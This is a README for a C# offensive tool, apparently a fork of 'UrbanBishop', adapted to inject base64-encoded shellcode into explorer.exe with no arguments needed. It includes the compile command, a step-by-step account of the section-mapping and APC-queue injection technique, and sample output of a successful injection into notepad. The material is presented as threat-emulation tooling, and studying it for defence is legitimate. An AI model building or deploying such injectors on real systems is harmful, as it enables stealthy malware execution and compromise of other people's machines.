# Edit

Adapted version of UrbanBishop such that it supports base64 encoded shellcode and automatically injects shellcode into explorer.exe. Therefore it can then be compiled into a single payload without needing any argument.

# Compile

csc.exe .\BerlinDefence.cs .\Program.cs .\Shellcode.cs

# Sharp-Suite

The king is dead, long live the king. I am starting a new repo with code samples in C#. My heart is still with PowerShell <3, lets face it using in-line C# in PowerShell is a much nicer experience than actually using C#! However, threat emulation has to evolve over time and so does the tooling.

## Pwn?

### UrbanBishop

UrbanBishop is a small POC I wrote while I was testing [Donut](https://github.com/TheWover/donut). If you haven't seen or used Donut I highly recommend you have a look at the magic TheWover & odzhan are doing there! This POC creates a local RW section in UrbanBishop and then maps that section as RX into a remote process. Once the shared section has been established the shellcode is written to the local section which then automatically propagates to the remote process. For execution UrbanBishop creates a remote suspended thread (start address is set to ntdll!RtlExitUserThread) and queues and APC on that thread, once resumed with NtAlertResumeThread the shellcode executes and the thread exits gracefully on completion. The POC can be adapted for inline shellcode but that was not my use case. I tested UrbanBishop on x64 Win10/Win7.

```
C:\> UrbanBishop.exe -i 3380 -p C:\Users\b33f\Desktop\sc.bin -c
   _O       _____     _
  / //\    |  |  |___| |_ ___ ___
 {     }   |  |  |  _| . | .'|   |
  \___/    |_____|_| |___|__,|_|_|
  (___)
   |_|          _____ _     _
  /   \        | __  |_|___| |_ ___ ___
 (_____)       | __ -| |_ -|   | . | . |
(_______)      |_____|_|___|_|_|___|  _|
/_______\                          |_|
                       ~b33f~

|--------
| Process    : notepad
| Handle     : 828
| Is x32     : False
| Sc binpath : C:\Users\b33f\Desktop\sc.bin
|--------

[>] Creating local section..
    |-> hSection: 0x338
    |-> Size: 31361
    |-> pBase: 0x2470000
[>] Map RX section to remote proc..
    |-> pRemoteBase: 0x16967970000
[>] Write shellcode to local section..
    |-> Size: 31361
[>] Seek export offset..
    |-> pRemoteNtDllBase: 0x7FFDE64A0000
    |-> LdrGetDllHandle OK
    |-> RtlExitUserThread: 0x7FFDE650CF10
    |-> Offset: 0x6CF10
[>] NtCreateThreadEx -> RtlExitUserThread <- Suspended..
    |-> Success
[>] Set APC trigger & resume thread..
    |-> NtQueueApcThread
    |-> NtAlertResumeThread
[>] Waiting for payload to finish..
    |-> Thread exit status -> 0
    |-> NtUnmapViewOfSection
```
